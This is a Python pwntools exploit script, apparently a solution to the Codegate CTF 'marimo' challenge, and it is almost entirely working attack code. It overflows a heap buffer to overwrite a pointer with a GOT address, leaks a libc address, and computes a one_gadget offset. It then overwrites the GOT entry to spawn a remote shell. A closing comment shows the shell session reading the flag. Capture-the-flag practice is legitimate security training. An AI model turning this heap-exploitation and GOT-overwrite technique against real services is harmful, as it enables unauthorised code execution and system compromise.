from pwn import *

r = remote("ch41l3ng3s.codegate.kr", 3333)

def add(name, profile):
	r.sendline(name)
	print r.recvuntil("profile")
	r.sendline(profile)
	print r.recvuntil(">> ")

def sell(idx):
	r.sendline("S")
	print r.recvuntil("(number)")
	r.sendline(str(idx))
	print r.recvuntil("?")
	r.sendline("S")
	print r.recvuntil(">> ")

def buy(size, name, profile):
	r.sendline("B")
	print r.recvuntil(">>")
	r.sendline(str(size))
	print r.recvuntil(">>")
	r.sendline("P")
	add(name, profile)

def modify(idx, prof):
	r.sendline("V")
	print r.recvuntil(">> ")
	r.sendline(str(idx))
	print r.recvuntil(">> ")
	r.sendline("M")
	print r.recvuntil(">> ")
	r.sendline(prof)
	print r.recvuntil(">> ")

print r.recvuntil(">> ")

for i in range(20):
	r.sendline("show me the marimo")
	add("asdf", "asdf")
	sell(0)

buy(1, "aaaa", "aaaaa")
buy(10, "bbbb", "bbbbb")

sleep(14)

modify(0, "A"*0x30+p32(0x0)+p32(0x1000)+p64(0x603018)+p64(0x603018))

r.sendline("B")
r.sendline("V")
r.sendline("1")

rv = r.recvuntil("\x7f")[-6:]

libc = u64(rv+"\x00\x00")
libc_base = libc - 0x6f690
one_shot = libc_base + 0x45216

print r.recvuntil("ack ?")
print r.recvuntil(">>")

r.sendline("M")
print r.recvuntil(">> ")
r.sendline(p64(one_shot))

r.interactive()

'''
[*] Switching to interactive mode
$ id
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
$ ls
flag
marimo
$ cat flag
But_every_cat_is_more_cute_than_Marimo
$ 
'''
